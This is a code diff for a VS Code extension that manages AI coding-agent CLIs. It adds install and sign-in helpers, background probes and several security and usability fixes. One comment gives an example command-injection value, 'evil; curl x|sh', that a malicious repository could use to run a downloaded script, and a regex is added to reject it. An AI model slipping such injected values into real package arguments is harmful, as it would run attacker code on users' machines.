@@ -1,7 +1,7 @@
 ﻿import * as vscode from 'vscode';
 import * as path from 'path';
 import * as fs from 'fs';
-import { execSync } from 'child_process';
+import * as crypto from 'crypto';
 import { areHooksInstalled, installHooks, uninstallHooks } from 'autodev-cli/hooksManager';
 import { isOpenCodeHooksInstalled, installOpenCodeHooks, uninstallOpenCodeHooks } from 'autodev-cli/openCodeHooksManager';
 import { ConfigManager } from 'autodev-cli/configManager';
@@ -37,6 +37,21 @@ const PROVIDER_KEY = 'autodev.selectedProvider';
 const FALLBACK_PROVIDER_KEY = 'autodev.fallbackProvider';
 const FALLBACK_ENABLED_KEY  = 'autodev.fallbackProviderEnabled';
 
+// Step-0 provider metadata: the binary to probe on PATH, the one-line install
+// command, the sign-in command, and a docs URL. Drives the "CLI not found"
+// onboarding banner + the gated Start button. Best-effort package names.
+interface ProviderMeta { bin: string; install: string; auth: string; docs: string }
+const PROVIDER_META: Record<string, ProviderMeta> = {
+  'claude-cli':   { bin: 'claude',   install: 'npm install -g @anthropic-ai/claude-code', auth: 'claude',              docs: 'https://docs.anthropic.com/en/docs/claude-code/overview' },
+  'claude-tui':   { bin: 'claude',   install: 'npm install -g @anthropic-ai/claude-code', auth: 'claude',              docs: 'https://docs.anthropic.com/en/docs/claude-code/overview' },
+  'copilot-cli':  { bin: 'copilot',  install: 'npm install -g @github/copilot',           auth: 'copilot',             docs: 'https://docs.github.com/copilot' },
+  'copilot-sdk':  { bin: 'copilot',  install: 'npm install -g @github/copilot',           auth: 'copilot',             docs: 'https://docs.github.com/copilot' },
+  'opencode-cli': { bin: 'opencode', install: 'npm install -g opencode-ai',               auth: 'opencode auth login', docs: 'https://opencode.ai/docs' },
+  'opencode-sdk': { bin: 'opencode', install: 'npm install -g opencode-ai',               auth: 'opencode auth login', docs: 'https://opencode.ai/docs' },
+  'grok-cli':     { bin: 'grok',     install: 'npm install -g @vibe-kit/grok-cli',        auth: 'grok',                docs: 'https://github.com/superagent-ai/grok-cli' },
+  'grok-tui':     { bin: 'grok',     install: 'npm install -g @vibe-kit/grok-cli',        auth: 'grok',                docs: 'https://github.com/superagent-ai/grok-cli' },
+};
+
 export class TodoViewProvider implements vscode.WebviewViewProvider {
   public static readonly viewType = 'autodev.chatStatus';
 
@@ -55,6 +70,7 @@ export class TodoViewProvider implements vscode.WebviewViewProvider {
   private _lastNotifyTime = 0;
   private _lastKnownMtime = 0;
   private _cozempicInstalled: boolean | null = null;
+  private _binInstalled: Record<string, boolean> = {}; // provider CLI bin -> on PATH (Step-0 probe)
   private _ocSessionsCache: Array<{ id: string; mtime: number }> = [];
 
   constructor(
@@ -94,7 +110,11 @@ export class TodoViewProvider implements vscode.WebviewViewProvider {
           const prev = loadSettings();
           // Merge with existing so MCP servers, profile sections, custom refs,
           // and other fields not present in the form are preserved.
-          const next: AutodevSettings = { ...prev, ...(msg.settings as AutodevSettings) };
+          // `provider` is owned by setProvider()/workspaceState — never let a
+          // form/quick-toggle payload persist it, or a *transient* fallback
+          // provider (set during a rate-limit) would be written to disk as the
+          // real provider and survive relaunch. Always keep the persisted value.
+          const next: AutodevSettings = { ...prev, ...(msg.settings as AutodevSettings), provider: prev.provider };
           saveSettings(next);
           this._startWatcher();
           // Sync hooks when enabled/scope changes.
@@ -147,6 +167,13 @@ export class TodoViewProvider implements vscode.WebviewViewProvider {
         case 'archiveTodo': {
           const root = vscode.workspace.workspaceFolders?.[0]?.uri.fsPath;
           if (!root) break;
+          // The archive rewrites TODO.md wholesale. If the loop is mid-task it
+          // may be writing an [x] to the same file — two unsynchronized rewrites
+          // can drop a task or resurrect a completed one. Block while running.
+          if (taskLoopRunner.state === 'running') {
+            vscode.window.showWarningMessage('AutoDev: Stop the task loop before archiving — it is currently writing to TODO.md.');
+            break;
+          }
           const settings = loadSettings();
           const todoPath = settings.todoPath || path.join(root, 'TODO.md');
           try {
@@ -208,7 +235,7 @@ export class TodoViewProvider implements vscode.WebviewViewProvider {
           }
           this._syncAndPushMcp();
           vscode.window.showInformationMessage(
-            `AutoDev: \ MCP server(s) active, settings saved to .mcp.json.`
+            `AutoDev: ${activeCount} MCP server${activeCount === 1 ? '' : 's'} active — saved to .mcp.json.`
           );
           break;
         }
@@ -282,6 +309,18 @@ export class TodoViewProvider implements vscode.WebviewViewProvider {
           if (!target) break;
           // Async probe — must not block the extension host.
           checkMcpInstallAsync({ command: target.command, args: target.args }).then(info => {
+            // SECURITY: the install command interpolates info.pkg (derived from a
+            // workspace .mcp.json arg, e.g. `npm install -g ${pkg}`) into a string
+            // typed straight into a shell terminal. A malicious repo could set an
+            // arg like `evil; curl x|sh`. Reject any package name that isn't a
+            // plain (optionally scoped) npm/uv package before it reaches the shell.
+            const SAFE_PKG = /^(@[a-z0-9-._~]+\/)?[a-z0-9-._~]+$/i;
+            if (info.pkg && !SAFE_PKG.test(info.pkg)) {
+              vscode.window.showErrorMessage(
+                `AutoDev: refusing to install '${name}' — package name '${info.pkg}' contains unexpected characters.`,
+              );
+              return;
+            }
             const cmd = installCommandFor(info);
             if (!cmd) {
               if (info.status === 'missing-runner' && (info.runner === 'npx' || info.runner === 'node' || info.runner === 'npm')) {
@@ -326,6 +365,39 @@ export class TodoViewProvider implements vscode.WebviewViewProvider {
           });
           break;
         }
+        case 'installProvider': {
+          // Open a terminal running the selected provider's install command.
+          const meta = PROVIDER_META[this._selectedProvider];
+          if (!meta) break;
+          const term = vscode.window.createTerminal(`Install: ${PROVIDERS[this._selectedProvider]?.label ?? this._selectedProvider}`);
+          term.show(true);
+          term.sendText(meta.install);
+          // Re-probe after the install likely finished so the badge/banner clear.
+          this._binInstalled = {};
+          setTimeout(() => this._probeSelectedProvider(), 15000);
+          break;
+        }
+        case 'signInProvider': {
+          const meta = PROVIDER_META[this._selectedProvider];
+          if (!meta) break;
+          const term = vscode.window.createTerminal(`Sign in: ${PROVIDERS[this._selectedProvider]?.label ?? this._selectedProvider}`);
+          term.show(true);
+          term.sendText(meta.auth);
+          break;
+        }
+        case 'openProviderDocs': {
+          const meta = PROVIDER_META[this._selectedProvider];
+          if (meta) { void vscode.env.openExternal(vscode.Uri.parse(meta.docs)); }
+          break;
+        }
+        case 'addExampleTask': {
+          this._addTask('Write a short README section describing what this project does');
+          break;
+        }
+        case 'openFolder': {
+          void vscode.commands.executeCommand('workbench.action.files.openFolder');
+          break;
+        }
       }
     });
 
@@ -334,14 +406,20 @@ export class TodoViewProvider implements vscode.WebviewViewProvider {
       this._sessionWatcher?.dispose(); this._sessionWatcher = undefined;
       this._settingsWatcher?.dispose(); this._settingsWatcher = undefined;
       if (this._pollTimer) { clearInterval(this._pollTimer); this._pollTimer = undefined; }
+      // Clear the view reference so any late async postMessage (opencode models
+      // probe, MCP install re-push, email test) no-ops instead of throwing
+      // "Webview is disposed" — optional chaining guards undefined, not a
+      // disposed-but-non-null view.
+      this._view = undefined;
     });
     webviewView.onDidChangeVisibility(() => { if (webviewView.visible) { this._refreshTasks(); } });
 
     this._cozempicInstalled = null; // re-check each time the panel opens
     this._startWatcher();
     this._refreshTasks();
-    // Defer install probes so the webview's service worker has time to
+    // Defer background probes so the webview's service worker has time to
     // register before we spawn child processes that hog the event loop.
+    setTimeout(() => { this._refreshCozempic(); this._probeSelectedProvider(); }, 1500);
     setTimeout(() => this._refreshMcpInstall(), 8000);
     if (this._selectedProvider === 'opencode-cli') { this._refreshOpenCodeSessions(); }
   }
@@ -365,6 +443,7 @@ export class TodoViewProvider implements vscode.WebviewViewProvider {
     const current = loadSettings();
     saveSettings({ ...current, provider: id });
     this._push();
+    this._probeSelectedProvider(); // Step-0 readiness for the newly-selected CLI
     if (id === 'opencode-cli') { this._refreshOpenCodeSessions(); }
   }
 
@@ -423,7 +502,12 @@ export class TodoViewProvider implements vscode.WebviewViewProvider {
     const todoPath = settings.todoPath || path.join(root, 'TODO.md');
     todoWriter.append(todoPath, text.trim())
       .then(() => this._refreshTasks())
-      .catch(() => {});
+      .catch((e: unknown) => {
+        // The webview already cleared the input on submit — without feedback the
+        // user thinks the task was added when the write actually failed
+        // (read-only TODO.md, bad todoPath, missing parent dir, ENOENT…).
+        vscode.window.showErrorMessage(`AutoDev: Could not add task — ${e instanceof Error ? e.message : String(e)}`);
+      });
   }
 
   private _startWatcher(): void {
@@ -587,18 +671,47 @@ export class TodoViewProvider implements vscode.WebviewViewProvider {
     }).catch(() => { /* ignore, keep stale cache */ });
   }
 
-  private _checkCozempic(): boolean {
-    if (this._cozempicInstalled !== null) { return this._cozempicInstalled; }
+  /**
+   * Probe for cozempic in the background. Previously this ran a synchronous
+   * login-shell (`execSync … -lc`) directly inside _push() on the extension-host
+   * thread, freezing VS Code on first sidebar render for users with a heavy
+   * shell profile. Now it's async + memoized; _push() reads the cached value and
+   * we re-push once the probe settles.
+   */
+  private _refreshCozempic(): void {
+    if (this._cozempicInstalled !== null) { return; }
     // VS Code's process doesn't inherit the user's full shell PATH (e.g. ~/.local/bin
     // where pip/pipx installs cozempic). Use a login shell so profile files are sourced.
     const shell = process.env.SHELL || 'bash';
-    try {
-      execSync(`${shell} -lc "cozempic --version"`, { stdio: 'pipe' });
-      this._cozempicInstalled = true;
-    } catch {
-      this._cozempicInstalled = false;
-    }
-    return this._cozempicInstalled;
+    // eslint-disable-next-line @typescript-eslint/no-require-imports
+    const { exec } = require('child_process') as typeof import('child_process');
+    exec(`${shell} -lc "cozempic --version"`, { timeout: 8000 }, (err: unknown) => {
+      this._cozempicInstalled = !err;
+      this._push();
+    });
+  }
+
+  /**
+   * Step-0 provider readiness. The primary dependency of this whole extension is
+   * an agent CLI on PATH — but the provider list used to hard-code every CLI as
+   * installed, so a first-timer picks "Claude", presses Start, and nothing
+   * happens (the spawn fails in a terminal/output channel they never open).
+   * Probe the selected provider's binary in the background (login shell, like the
+   * cozempic probe) and re-push so the dropdown, the Tasks banner and the gated
+   * Start button reflect the real state.
+   */
+  private _probeSelectedProvider(): void {
+    const meta = PROVIDER_META[this._selectedProvider];
+    if (!meta) { return; }
+    const bin = meta.bin;
+    if (Object.prototype.hasOwnProperty.call(this._binInstalled, bin)) { return; } // cached
+    const shell = process.env.SHELL || 'bash';
+    // eslint-disable-next-line @typescript-eslint/no-require-imports
+    const { exec } = require('child_process') as typeof import('child_process');
+    exec(`${shell} -lc "command -v ${bin}"`, { timeout: 8000 }, (err: unknown, stdout: string) => {
+      this._binInstalled[bin] = !err && !!String(stdout || '').trim();
+      this._push();
+    });
   }
 
   private _push(): void {
@@ -646,12 +759,31 @@ export class TodoViewProvider implements vscode.WebviewViewProvider {
       selectedProvider: this._selectedProvider,
       fallbackProvider: this._fallbackProvider,
       fallbackProviderEnabled: this._fallbackProviderEnabled,
-      providers: (Object.entries(PROVIDERS) as [ProviderId, ProviderConfig][]).map(([id, cfg]) => ({
-        id,
-        label: cfg.label,
-        isCli: !!cfg.isCli,
-        installed: cfg.isCli ? true : !!vscode.extensions.getExtension(cfg.extensionId),
-      })),
+      providers: (Object.entries(PROVIDERS) as [ProviderId, ProviderConfig][]).map(([id, cfg]) => {
+        const ext = !cfg.isCli && !!vscode.extensions.getExtension(cfg.extensionId);
+        const bin = PROVIDER_META[id]?.bin;
+        // ready: true | false (probed & missing) | null (not yet probed → don't
+        // flag). Only the currently-selected provider's bin is probed, so other
+        // CLIs stay unmarked until selected.
+        const ready: boolean | null = cfg.isCli
+          ? (bin && Object.prototype.hasOwnProperty.call(this._binInstalled, bin) ? this._binInstalled[bin] : null)
+          : ext;
+        return { id, label: cfg.label, isCli: !!cfg.isCli, installed: cfg.isCli ? true : ext, ready };
+      }),
+      selectedProviderReady: (() => {
+        const meta = PROVIDER_META[this._selectedProvider];
+        if (!meta) { return null; }
+        const known = Object.prototype.hasOwnProperty.call(this._binInstalled, meta.bin);
+        return {
+          id: this._selectedProvider,
+          label: PROVIDERS[this._selectedProvider]?.label ?? this._selectedProvider,
+          installed: known ? this._binInstalled[meta.bin] : null, // true | false | null(pending)
+          installCmd: meta.install,
+          authCmd: meta.auth,
+          docs: meta.docs,
+        };
+      })(),
+      hasWorkspace: !!root,
       tasks: this._tasks.map(t => ({ text: t.text, status: t.status, completedDate: t.completedDate, line: t.line })),
       loopState: this._loopState,
       loopTask: this._loopTask,
@@ -662,7 +794,7 @@ export class TodoViewProvider implements vscode.WebviewViewProvider {
       availableSessions,
       resumeAt: taskLoopRunner.resumeAt?.getTime() ?? null,
       profiles: getBuiltinProfiles(),
-      cozempicInstalled: this._checkCozempic(),
+      cozempicInstalled: this._cozempicInstalled ?? false,
       hooksInstalled: root ? areHooksInstalled('project', root) : false,
       openCodeHooksInstalled: root ? isOpenCodeHooksInstalled(root) : false,
       mcpDefaults: DEFAULT_MCP_SERVERS.map(s => ({ name: s.name, command: s.command, args: s.args })),
@@ -680,7 +812,7 @@ export class TodoViewProvider implements vscode.WebviewViewProvider {
 // ---------------------------------------------------------------------------
 
 function buildHtml(webview: vscode.Webview): string {
-  const nonce = Math.random().toString(36).slice(2) + Math.random().toString(36).slice(2);
+  const nonce = crypto.randomBytes(16).toString('base64');
   return `<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -699,7 +831,7 @@ function buildHtml(webview: vscode.Webview): string {
 </div>
 <div class="fallback-row" id="fallbackRow">
   <input type="checkbox" id="fallbackCheck">
-  <label for="fallbackCheck" style="white-space:nowrap">On limit, use:</label>
+  <label for="fallbackCheck" style="white-space:nowrap">If rate-limited, switch to:</label>
   <select class="provider-select" id="fallbackSelect"></select>
 </div>
 <div class="model-row" id="claudeModelRow" style="display:none">
@@ -728,7 +860,6 @@ function buildHtml(webview: vscode.Webview): string {
 <div class="resume-row" id="resumeRow" style="display:none">
   <input type="checkbox" id="resumeCheck">
   <label for="resumeCheck">Resume session</label>
-  <button class="new-session-btn" id="newSessionBtn" title="Clear saved session — next run starts a new session">&#8635; New</button>
 </div>
 <button class="periodic-toggle" id="periodicToggleBtn" style="display:none" onclick="togglePeriodic()">
   <em class="periodic-toggle-arrow" id="periodicArrow">&#9660;</em> Periodic &amp; schedule
@@ -775,9 +906,9 @@ ${PERIODIC_ACTIONS.map(a => `
   <select id="sessionSelect" style="flex:1;min-width:0;font-size:11px" title="Select an existing session or start a new one">
     <option value="">⊕ New session</option>
   </select>
-  <button class="new-session-btn" id="compactBtn" title="Run /compact on current session to summarise history">&#x1F5DC; Compact</button>
-  <button class="new-session-btn" id="archiveTodoBtn" title="Move completed [x] tasks from TODO.md to DONE.md">&#x1F4E6; Archive</button>
-  <button class="new-session-btn" id="renameSessionBtn" title="Set a display name for this session">&#x270F;</button>
+  <button class="new-session-btn" id="compactBtn" aria-label="Compact session" title="Run /compact on current session to summarise history">&#x1F5DC; Compact</button>
+  <button class="new-session-btn" id="archiveTodoBtn" aria-label="Archive completed tasks" title="Move completed [x] tasks from TODO.md to DONE.md">&#x1F4E6; Archive</button>
+  <button class="new-session-btn" id="renameSessionBtn" aria-label="Rename session" title="Set a display name for this session">&#x270F;</button>
 </div>
 <div class="model-row" id="renameRow" style="display:none;gap:4px">
   <input type="text" id="renameInput" placeholder="Session name…" style="flex:1;min-width:0">
@@ -790,9 +921,9 @@ ${PERIODIC_ACTIONS.map(a => `
 </div>
 <div class="tab-bar">
   <button class="tab-btn active" id="tabTasks">Tasks</button>
-  <button class="tab-btn" id="tabMcp">MCP</button>
-  <button class="tab-btn" id="tabProfile">&#9776; Profile</button>
-  <button class="tab-btn" id="tabSettings">&#9881; Settings</button>
+  <button class="tab-btn" id="tabMcp" title="MCP servers — Jira, email, and other tools your agent can use">Tools</button>
+  <button class="tab-btn" id="tabProfile">Profile</button>
+  <button class="tab-btn" id="tabSettings">Settings</button>
 </div>
 ${tasksPanelHtml}
 ${mcpConfigHtml}
@@ -819,11 +950,12 @@ function showTab(tab) {
   if(tab==='profile'){renderProfileSections(state.profileSections||[], state.enabledProfileSections||[], state.customProfileRefs||[]);}
 }
 
-function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
+function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');}
 
 // Persistent open/closed state for the periodic section.
-// Starts OPEN so settings are immediately visible; user can collapse with the header button.
-var _periodicOpen = true;
+// Starts CLOSED — a first-timer should see provider + Start, not a wall of
+// per-N-tasks scheduling rows. Power users open it once with the header button.
+var _periodicOpen = false;
 
 function togglePeriodic(){
   _periodicOpen = !_periodicOpen;
@@ -841,8 +973,12 @@ function statusIcon(s){
 
 function buildProviderOptions(providers, selectedId) {
   return providers.map(function(p) {
-    var label = esc(p.label) + (p.installed ? '' : ' \u2717');
-    var dis = p.installed ? '' : ' disabled';
+    // ready===false means we probed and the CLI/extension is missing. CLIs stay
+    // selectable (so the user can pick one and get the install banner); only a
+    // missing *extension* provider is disabled.
+    var missing = p.ready === false;
+    var label = esc(p.label) + (missing ? ' \u2717 not installed' : '');
+    var dis = (!p.isCli && !p.installed) ? ' disabled' : '';
     var sel = p.id === selectedId ? ' selected' : '';
     return '<option value="' + p.id + '"' + dis + sel + '>' + label + '</option>';
   }).join('');
@@ -1146,7 +1282,7 @@ window.addEventListener('message',function(e){
       else{if(state.settings){state.settings.resumeSession=pr;}}
     }
     var loader=document.getElementById('sidebarLoader');if(loader){loader.style.display='none';}
-    renderProviders();renderLoop();renderTasks();showTab(activeTab);
+    renderProviders();renderProviderBanner();renderLoop();renderTasks();showTab(activeTab);
     document.getElementById('cozempicBanner').style.display=msg.cozempicInstalled===false?'':'none';
     document.getElementById('hooksStatusBadge').style.display=msg.hooksInstalled?'':'none';
     document.getElementById('openCodeHooksStatusBadge').style.display=msg.openCodeHooksInstalled?'':'none';
@@ -1159,7 +1295,9 @@ window.addEventListener('message',function(e){
       var ocInp=document.getElementById('opencodeModelInput');
       if(ocInp){
         ocInp.dataset.loaded='ready';
-        ocInp.value=(state.settings&&state.settings.opencodeModel)||'';
+        // Don't clobber what the user is typing if the (up to 10s) models probe
+        // lands while the search box is focused.
+        if(document.activeElement!==ocInp){ocInp.value=(state.settings&&state.settings.opencodeModel)||'';}
         ocInp.onchange=function(){
           vscode.postMessage({command:'saveSettings',settings:Object.assign({},state.settings||{},{opencodeModel:ocInp.value})});
         };
